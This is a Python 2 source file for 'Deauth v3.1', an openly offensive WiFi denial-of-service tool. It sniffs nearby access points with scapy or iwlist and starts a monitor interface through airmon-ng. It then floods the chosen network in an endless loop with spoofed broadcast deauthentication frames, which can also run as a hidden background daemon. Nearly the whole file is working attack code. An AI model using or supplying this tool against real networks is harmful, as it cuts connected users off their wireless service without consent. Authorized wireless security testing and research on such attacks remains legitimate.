#!/usr/bin/env python2
"""
Sends deauth packets to a wifi network which results network outage for connected devices.
"""
__author__ ="Veerendra Kakumanu (veerendra2)"
__license__ = "Apache 2.0"
__version__ = "3.1"
__maintainer__ = "Veerendra Kakumanu"
__credits__ = ["Franz Kafka"]

import os
import sys
import re
import logging
import subprocess
import argparse
import signal

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    import scapy.all
except ImportError:
    print "[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'"
    exit(1)

scapy.all.conf.verbose = False
PID_FILE = "/var/run/deauth.pid"
WIRELESS_FILE = "/proc/net/wireless"
DEV_FILE = "/proc/net/dev"
PACKET_COUNT = 2000
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
PATTREN = {"MAC Address": 'Address:(.*)',
            "ESSID": 'ESSID:(.*)',
            "ID": '(.*) - Address'}


def banner():
    print "\n+----------------------------------------------------------------+"
    print "|Deauth v3.1                                                     |"
    print "|Coded by Veerendra Kakumanu (veerendra2)                        |"
    print "|Blog: https://veerendra2.github.io/wifi-deathentication-attack/ |"
    print "|Repo: https://github.com/veerendra2/wifi-deauth-attack          |"
    print "+----------------------------------------------------------------+\n"


def execute(cmd, verbose=False):
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out = []
    while True:
        line = p.stdout.readline()
        out.append(line)
        if verbose:
            print line,
        if not line and p.poll() is not None:
            break
    if p.returncode != 0:
        print p.stderr.read().strip()
        return 1
    else:
        return ''.join(out).strip()


def daemonize():
    if os.fork():
        os._exit(0)
    os.chdir("/")
    os.umask(022)
    os.setsid()
    os.umask(0)
    if os.fork():
        os._exit(0)
    stdin = open(os.devnull)
    stdout = open(os.devnull, 'w')
    os.dup2(stdin.fileno(), 0)
    os.dup2(stdout.fileno(), 1)
    os.dup2(stdout.fileno(), 2)
    stdin.close()
    stdout.close()
    os.umask(022)
    for fd in xrange(3, 1024):
        try:
            os.close(fd)
        except OSError:
            pass


class CreatIface:
    def __init__(self, iwlist=False):
        self.monIface = None
        self.Iface = None
        self.readDevFile()

    def getWIface(self):
        try:
            with open(WIRELESS_FILE) as f:
                self.Iface = re.findall(r'(.*):', f.read())[0].strip()
                return self.Iface
        except:
            print RED+"[-] Wireless interface not found"+ENDC
            while 1:
                iface = raw_input("Please enter wireless interface name> ").strip()
                if iface:
                    self.Iface = iface
                print RED+"[-] Please specify wireless interface name"+ENDC
                continue

    def readDevFile(self, verbose=True):
        with open(DEV_FILE) as f:
            devIface = re.findall(r'(mon[0-9]+|prism[0-9]+|\b([a-zA-Z0-9]+)mon)', f.read())
        if devIface:
            if len(devIface[0]) == 2:
                self.monIface = devIface[0][0]
                self.Iface = devIface[0][1]
            elif len(devIface[0]) == 1:
                self.monIface = devIface[0][0]

    def createmonIface(self):
        if not self.monIface:
            print "[.] Attempting start airmon-ng"
            exit_status = execute("airmon-ng start {} > /dev/null 2>&1".format(self.Iface))
            if exit_status == 1:
                print RED+"[-] Something went wrong. Check wireless interface?, is airmon-ng working?"+ENDC
                exit(1)
            self.readDevFile(False)
        if self.Iface and self.monIface:
            print "[*] Wireless interface   : " + self.Iface
            print "[*] Monitoring interface : " + self.monIface


def spinner():
    while True:
        for cursor in '|/-\\':
            yield cursor


spin = spinner()


class sniffWifi(object):
    def __init__(self, mon, pktlimit):
        self.mon = mon
        self.ap_list = dict() #Key--> ssidcount, Value-->[MAC, SSID]
        self.ap_set = set()
        self.pktcount = 0
        self.ssidcount = 0
        self.pktlimit = pktlimit #Number of beacons should listen

    def packetHandler(self,pkt):
        self.pktcount += 1
        if pkt.haslayer(scapy.all.Dot11) and pkt.type == 0 and pkt.subtype == 8 and pkt.addr2 not in self.ap_set:
            self.ssidcount += 1
            self.ap_set.add(pkt.addr2)
            self.ap_list.setdefault(str(self.ssidcount), [pkt.addr2, pkt.info])

    def stopFilter(self, x): #Stop the Sniffing if packet reachs the count
        sys.stdout.write("\b{}".format(next(spin)))
        sys.stdout.flush()
        if self.pktlimit < self.pktcount:
            return True
        else:
            return False

    def runSniff(self): #Sniffing Here!
        print "[+] Monitoring wifi signals, it will take some time(or use '-w' option). Please wait.....",
        scapy.all.sniff(iface=self.mon, prn=self.packetHandler, stop_filter=self.stopFilter)
        print "\n"
        return self.ap_list


def get_aplist(Iface):
    result = None
    ap = dict()
    print "[+] Running : sudo iwlist {} s".format(Iface)
    for x in range(3): #Sometimes it command is not running
        if x == 2:
            print RED+"[-] Something went worng. 'iwlist' working? or run-> service network-manager restart"+ENDC
            exit(1)
        try:
            result = subprocess.check_output("sudo iwlist {} s".format(Iface), shell=True)
            break
        except:
            continue
    for name, pattern in PATTREN.items():
        PATTREN[name] = re.compile(pattern)
    for line in result.split("Cell"):
        if line and "Scan completed" not in line:
            mac = PATTREN["MAC Address"].findall(line)[0].strip()
            ssid = PATTREN["ESSID"].findall(line)[0].strip('"')
            ids = str(int(PATTREN["ID"].findall(line)[0].strip()))
            ap.setdefault(ids, [mac, ssid])
    return ap


def manage_process(status): # 0 for Check & 1 for kill
    daemon_pid = None
    try:
        with open(PID_FILE) as f:
            daemon_pid = f.read()
    except: pass
    if not daemon_pid:
        if status == 1:
            print "[-] 'Deauth daemon' is not running"
    else:
        if status == 0:
            print "[+] 'Deauth daemon' is already running with pid {}".format(daemon_pid)
            exit(0)
        elif status == 1:
            os.kill(int(daemon_pid), signal.SIGTERM)
            try:
                os.remove(PID_FILE)
            except: pass
            print "[*] Deauth daemon killed"
            exit(0)


def send_deauth(mac, mon):
    pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac[0], addr3=mac[0])/scapy.all.Dot11Deauth()
    print GREEN+"[*] Sending Deauthentication Packets to -> "+mac[1]+ENDC
    while True:
        try:
            sys.stdout.write("\b{}".format(next(spin)))
            sys.stdout.flush()
            scapy.all.sendp(pkt, iface=mon, count=1, inter=.2, verbose=0)
        except KeyboardInterrupt:
            print "\n"
            exit(0)


def render_ouput(ap):
    if not ap:
        print RED+"[-] Wifi hotspots not found near by you."+ENDC
        exit(1)
    print "+".ljust(5, "-")+"+".ljust(28,"-")+"+".ljust(20, "-")+"+"
    print "| ID".ljust(5, " ")+"|"+"     Wifi Hotspot Name     "+"|"+"    MAC Address    |"
    print "+".ljust(5, "-")+"+".ljust(28, "-")+"+".ljust(20, "-")+"+"
    for id, ssid in ap.items():
        print "|", str(id).ljust(3, " ")+"|", ssid[1].ljust(26, " ")+"|", ssid[0].ljust(17, " ")+" |"
    print "+".ljust(5, "-")+"+".ljust(28,"-")+"+".ljust(20, "-")+"+"
    while 1:
        try:
            res = raw_input("Choose ID>>")
            if res in ap:
                break
        except KeyboardInterrupt:
            print "\n"
            exit(0)
        except: pass
        print "Invalid option. Please try again\n"
    return ap[res]


def write_pid():
    with open(PID_FILE, 'w') as f:
        f.write(str(os.getpid()))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Sends deauthentication packets to a wifi network which results \
                                                network outage for connected devices.  [Coded by VEERENDRA KAKUMANU]')
    parser.add_argument('-d', action='store_true', dest='daemon', default=False, help='Run as daemon')
    parser.add_argument('-c', action='store', dest='count', help='Stops the monitoring after this count reachs.\
                                                                                                By default it is 2000')
    parser.add_argument('-m', action='store', dest='mac', help='Sends deauth packets to this network')
    parser.add_argument('-w', action='store_true', dest='iwlist', help='Uses "iwlist" to get wifi hotspots list')
    parser.add_argument('-k', action='store_true', dest='kill', default=False, help='Kills "Deauth Daemon" if it is running')
    parser.add_argument('-v', action='version', version='%(prog)s 3.1')
    results = parser.parse_args()
    if not os.geteuid() == 0:
        print RED+"[-] Script must run with 'sudo'"+ENDC
        exit(1)
    if results.kill:
        manage_process(1)
        exit(0)
    banner()
    manage_process(0)
    if results.count:
        PACKET_COUNT = int(results.count)
    Interface = CreatIface()
    if results.mac:
        if not re.search(r'(?:[0-9a-fA-F]:?){12}', results.mac.strip()):
            print RED+"[-] Incorrect MAC address format. Please check", results.mac.strip()+ENDC
            exit(1)
        if not Interface.Iface:
            Interface.getWIface()
        Interface.createmonIface()
        if results.daemon:
            print GREEN+"[*] Running as daemon. Wrote pid :" + PID_FILE+ENDC
            daemonize()
            write_pid()
        send_deauth([results.mac.strip(), results.mac.strip()], Interface.monIface)
    elif results.iwlist:
        wifi = None
        if not Interface.Iface:
            Interface.getWIface()
            ap_list = get_aplist(Interface.Iface)
            wifi = render_ouput(ap_list)
            Interface.createmonIface()
        else:
            print "[.] Overriding option '-w'. Look like there is already mon interface exits. Fallback to airmon-ng sniffing"
            Interface.createmonIface()
            sniff = sniffWifi(Interface.monIface, PACKET_COUNT)
            wifi = render_ouput(sniff.runSniff())
        if results.daemon:
            print GREEN+"[*] Running as daemon. Wrote pid :"+PID_FILE+ENDC
            daemonize()
            write_pid()
        send_deauth(wifi, Interface.monIface)
    else:
        if not Interface.Iface:
            Interface.getWIface()
        Interface.createmonIface()
        sniff = sniffWifi(Interface.monIface, PACKET_COUNT)
        wifi = render_ouput(sniff.runSniff())
        if results.daemon:
            print GREEN+"[*] Running as daemon. Wrote pid :" + PID_FILE+ENDC
            daemonize()
            write_pid()
        send_deauth(wifi, Interface.monIface)
